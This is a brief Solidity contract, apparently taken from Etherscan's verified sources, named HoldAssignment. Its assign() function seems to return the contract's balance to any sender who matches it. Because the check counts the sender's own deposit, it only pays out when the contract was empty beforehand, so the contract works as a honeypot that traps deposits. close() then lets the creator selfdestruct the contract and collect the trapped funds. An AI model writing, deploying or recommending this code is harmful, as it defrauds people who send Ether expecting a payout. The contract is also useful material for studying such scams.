/**
 * Source Code first verified at https://etherscan.io on Tuesday, March 26, 2019
 (UTC) */

pragma solidity ^0.4.25;

contract HoldAssignment
{
    constructor() public payable {
        org = msg.sender;
    }
    function() external payable {}
    address org;
    function close() public {
        if (msg.sender==org)
            selfdestruct(msg.sender);
    }
    function assign() public payable {
        if (msg.value >= address(this).balance)
            msg.sender.transfer(address(this).balance);
    }
}